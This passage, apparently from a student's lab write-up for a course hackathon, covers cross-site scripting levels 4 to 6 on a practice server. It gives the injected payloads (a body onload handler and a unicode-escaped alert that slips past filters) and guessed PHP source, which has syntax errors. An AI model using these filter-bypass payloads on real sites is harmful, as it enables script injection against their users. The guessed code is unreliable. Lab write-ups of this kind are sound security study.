**Level-4**
- URL: http://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php
- At level-4 the  <Script> tag directly  filtered  and broken,it has utilised the functions onload() of the body tag to perform the XSS script.By combiningbthe script with that function it triggers the alert when loading is finished.
-Attacking Script:
   "?input= <body onload=alert('Level-4 Hacked by Sai Kumar Gadde')>hacked</body>"

Guess Source Code:
- source code : ` Guessing source code `
```
	
		
```

![level-4](images/head.png)

**Level-5**
- URL: http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php
- At this particular level-5,security measures are implemented,filtering out both the script tag and the alert function.To bypass these restrictions and trigger a popup alert, a combination of unique encoding and onload() method and body tag is used.This allows for execution of javascriptcode indirectly. 

-Attacking Script:
   ?input= <body onload="\u0061lert('Level-5 Hacked by Sai Kumar Gadde')">hacked</body>

- Guess Source Code:
- source code: `Guessing source code`
```
   $input =  $_GET['input']
		if (preg_match('/<script\b[^>]*>(.*?')<\/script>/is',$data) || stripos($data 'alert')!== false) {
			exit('{"error": "No \'script\' is allowed!"}');
		}
		else
			echo($input);

![Level-5](images/head.png)

**Level-6**
- URL: http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php
- The above Ur; utilizes htmlentities() to convert user input into HTML entities,displaying it as text.JavaScript event listeners,like onclick(),trigger alerts on key presses within the input field,enabling javascript execution while maintaining user input as plain text for security.
Attacking Script:
   ?input= <body onload="\u0061lert('Level-6 Hacked by Sai Kumar Gadde')">hacked</body>
Guess Source Code:
- source code: `Guessing source code`
```
   echo htmlentities($_REQUEST('input'))  ;
```

![level-6](images/head.png)

![level-6-1](images/head.png)

## Task

   








